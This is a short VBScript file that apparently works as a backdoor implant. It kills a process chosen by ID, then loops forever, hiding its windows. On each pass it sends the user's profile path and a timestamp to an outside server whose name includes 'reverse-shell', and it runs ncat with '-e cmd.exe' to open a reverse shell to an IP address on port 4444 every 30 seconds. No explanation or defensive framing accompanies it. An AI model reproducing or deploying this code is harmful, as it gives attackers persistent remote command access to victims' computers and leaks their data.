WScript.Sleep 1000
Set oShell = CreateObject("Wscript.Shell")
pid = WScript.Arguments(0)
oShell.run "taskkill /F /PID " & pid, 0, True
Do While True
	Set oShell = CreateObject("Wscript.Shell")
	data = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & " " & Now 
	Set o = CreateObject("MSXML2.XMLHTTP")
	o.open "GET", "https://reverse-shell.redplasma.repl.co/process?data=" & data, True
	o.send
	oShell.run "cmd /c cd %userprofile%\photos01\camera\roll & ncat 192.168.47.1 4444 -e cmd.exe", 0, True
	WScript.Sleep 30000
Loop
